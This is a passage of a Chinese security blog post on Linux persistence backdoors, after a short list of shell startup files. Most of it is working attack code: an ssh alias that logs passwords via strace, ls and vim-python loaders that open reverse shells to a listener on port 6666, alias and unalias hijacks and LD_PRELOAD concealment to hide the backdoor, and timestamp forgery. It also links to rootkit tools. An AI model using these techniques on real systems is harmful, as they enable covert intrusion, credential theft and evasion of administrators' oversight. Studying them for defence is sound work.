+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1) /etc/profile</span><br><span class="line"></span><br><span class="line">【系统级】Linux是一个多用户操作系统。用户登录或切换（即Login shell 启动）时都有一个专用的运行环境，但首先执行 /etc/profile</span><br><span class="line"></span><br><span class="line">2) /etc/bashrc</span><br><span class="line"></span><br><span class="line">【系统级】在 bash shell 打开时运行，修改该文件配置的环境变量将会影响所有用户使用的bash shell</span><br><span class="line"></span><br><span class="line">3) ~/.bashrc</span><br><span class="line"></span><br><span class="line">【用户级】当用户登录时以及每次打开新的shell时该文件都将被读取，不推荐在这里配置用户专用的环境变量，因为每开一个shell，该文件都会被读取一次</span><br><span class="line"></span><br><span class="line">4) ~/.bash_profile &amp;&amp; ~./bash_login</span><br><span class="line"></span><br><span class="line">【用户级】</span><br><span class="line"></span><br><span class="line">如果有其中的一个文件存在的话, 当启动的是一个登录shell时，Bash 会执行该文件而不会执行~/.profile </span><br><span class="line"></span><br><span class="line">如果两个文件都存在的话，Bash 将会优先执行~/.bash_profile 而不是~/.bash_login </span><br><span class="line"></span><br><span class="line">5) ~/.bash_logout</span><br><span class="line"></span><br><span class="line">【用户级】当每次退出系统(退出bash shell)时执行该文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-后门制作"><a href="#2-后门制作" class="headerlink" title="2. 后门制作"></a>2. 后门制作</h3><p>当前用户目录下.bashrc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ssh=&#x27;strace -o /tmp/sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read,write,connect -s 2048 ssh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>创建alias后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1) 受控端创建别名</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;&#x27;&quot;&#x27;&quot;192.168.1.1&quot;&#x27;&quot;&#x27;&quot;,&quot;&#x27;&quot;&#x27;&quot;6666&quot;&#x27;&quot;&#x27;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#x27;&quot;&#x27;&quot;r&quot;&#x27;&quot;&#x27;&quot;)&#123;|io|c.print io.read&#125;end&#x27;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">2）攻击端监听本地端口</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line">3) 受控端执行别名命令，攻击端获得反弹shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-后门隐藏"><a href="#3-后门隐藏" class="headerlink" title="3. 后门隐藏"></a>3. 后门隐藏</h3><p>alias命令可以查看当前的别名，会让别名后门暴露。因此需要劫持alias命令，使输出中不显示后门指令。</p>
+<p>另外unalias命令会清除别名，也需要对其进行劫持，避免后门指令的别名被清除。</p>
+<p><strong>1）创建unalias别名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2) 创建alias的别名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">劫持前先将当前alias结果保存至比较隐蔽的文件</span><br><span class="line">alias &gt; /etc/gnupg/.gnupg</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3) 文件位置隐蔽</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1) 在正常的位置创建合理的文件</span><br><span class="line">vi /etc/yum/yum-update.rc  //创建文件，加入别名设置</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;&#x27;&quot;&#x27;&quot;192.168.1.1&quot;&#x27;&quot;&#x27;&quot;,&quot;&#x27;&quot;&#x27;&quot;6666&quot;&#x27;&quot;&#x27;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#x27;&quot;&#x27;&quot;r&quot;&#x27;&quot;&#x27;&quot;)&#123;|io|c.print io.read&#125;end&#x27;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br><span class="line"></span><br><span class="line">2) 将正常文件的时间复制给包含alias的文件</span><br><span class="line"></span><br><span class="line">touch -acmr version-groups.conf yum-update.rc</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门</span><br><span class="line"></span><br><span class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile json.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f json.py</span><br><span class="line"></span><br><span class="line">// 脚本代码</span><br><span class="line"></span><br><span class="line">import socket, subprocess, os;</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;192.168.121.1&quot;, 6666));</span><br><span class="line">os.dup2(s.fileno(), 0);</span><br><span class="line">os.dup2(s.fileno(), 1);</span><br><span class="line">os.dup2(s.fileno(), 2);</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;]);</span><br><span class="line"></span><br><span class="line">//  攻击机监听6666端口并获取反弹的shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1) echo $LD_PRELOAD </span><br><span class="line"></span><br><span class="line">alias echo=&#x27;func()&#123; echo $* | sed &quot;s!/home/hook.so! !g&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">2) env</span><br><span class="line"></span><br><span class="line">alias env=&#x27;func()&#123; env $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">3) set </span><br><span class="line"></span><br><span class="line">alias set=&#x27;func()&#123; set $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">4) export </span><br><span class="line"></span><br><span class="line">alias export=&#x27;func()&#123; export $* | grep -v &quot;/home/hook.so&quot;;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">5) unalias劫持</span><br><span class="line"></span><br><span class="line">alias unalias=&#x27;func()&#123; if [ $# != 0 ]; then if [ $* != &quot;echo&quot; ]&amp;&amp;[ $* != &quot;env&quot; ]&amp;&amp;[ $* != &quot;set&quot; ]&amp;&amp;[ $* != &quot;export&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;func&#x27;</span><br><span class="line"></span><br><span class="line">6) alias劫持</span><br><span class="line"></span><br><span class="line">alias alias=&#x27;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/mempodippy/cub3">https://github.com/mempodippy/cub3</a> </li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mempodippy/vlany">https://github.com/mempodippy/vlany</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Persistence/" rel="tag"># Persistence</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/51159/" rel="prev" title="未授权漏洞总结">
+                  <i class="fa fa-chevron-left"></i> 未授权漏洞总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/50959/" rel="next" title="服务渗透指北">
+                  服务渗透指北 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
